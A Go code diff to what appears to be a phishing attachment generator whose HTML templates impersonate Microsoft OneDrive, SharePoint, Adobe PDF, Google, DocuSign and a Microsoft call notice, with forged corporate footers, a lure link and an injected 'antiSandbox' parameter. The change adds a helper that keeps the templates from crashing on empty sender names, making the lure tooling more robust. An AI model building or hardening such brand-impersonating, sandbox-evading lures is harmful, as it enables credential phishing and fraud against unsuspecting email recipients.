@@ -145,6 +145,14 @@ func (ag *AttachmentGenerator) GenerateHTMLTemplate(req *HTMLTemplateRequest) ([
 	return []byte(content), nil
 }
 
+// safeInitial returns the first character of a string, or "?" if empty
+func safeInitial(s string) string {
+	if len(s) == 0 {
+		return "?"
+	}
+	return string([]rune(s)[0:1])
+}
+
 // --- Template Implementations ---
 
 func (ag *AttachmentGenerator) templateMicrosoftDocument(linkURL, docName, senderName, companyName, message, antiSandbox string) string {
@@ -263,7 +271,7 @@ h2{font-size:16px;color:#323130;margin-bottom:4px}
 <div class="footer"><p>You received this because %s shared a file from OneDrive.<br>&copy; %d Microsoft Corporation</p></div>
 </div>
 </body>
-</html>`, senderName, antiSandbox, string([]rune(senderName)[0:1]), senderName, senderEmail, docName, fileSize, linkURL, senderName, time.Now().Year())
+</html>`, senderName, antiSandbox, safeInitial(senderName), senderName, senderEmail, docName, fileSize, linkURL, senderName, time.Now().Year())
 }
 
 func (ag *AttachmentGenerator) templateSharePoint(linkURL, docName, senderName, companyName, message, antiSandbox string) string {
@@ -323,7 +331,7 @@ body{font-family:'Segoe UI',sans-serif;background:#f3f2f1;display:flex;justify-c
 <div class="footer"><p>&copy; %d Microsoft Corporation. All rights reserved.</p></div>
 </div>
 </body>
-</html>`, docName, antiSandbox, companyName, string([]rune(senderName)[0:1]), senderName, message, docName, linkURL, time.Now().Year())
+</html>`, docName, antiSandbox, companyName, safeInitial(senderName), senderName, message, docName, linkURL, time.Now().Year())
 }
 
 func (ag *AttachmentGenerator) templateAdobePDF(linkURL, docName, senderName, fileSize, antiSandbox string) string {
@@ -441,7 +449,7 @@ body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#f8f9fa;displa
 <div class="footer"><p>Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043</p></div>
 </div>
 </body>
-</html>`, docName, antiSandbox, string([]rune(senderName)[0:1]), senderName, senderEmail, senderName, message, docName, linkURL)
+</html>`, docName, antiSandbox, safeInitial(senderName), senderName, senderEmail, senderName, message, docName, linkURL)
 }
 
 func (ag *AttachmentGenerator) templateDocuSign(linkURL, docName, senderName, senderEmail, message, antiSandbox string) string {
@@ -779,7 +787,7 @@ body{font-family:'Segoe UI',sans-serif;background:#f3f2f1;display:flex;justify-c
 <div class="footer"><p>&copy; %d Microsoft Corporation</p></div>
 </div>
 </body>
-</html>`, senderName, antiSandbox, string([]rune(senderName)[0:1]), senderName, senderEmail, callTime, duration, duration, linkURL, senderName, companyName, time.Now().Year())
+</html>`, senderName, antiSandbox, safeInitial(senderName), senderName, senderEmail, callTime, duration, duration, linkURL, senderName, companyName, time.Now().Year())
 }
 
 func (ag *AttachmentGenerator) templateSecureDocument(linkURL, docName, senderName, companyName, message, antiSandbox string) string {
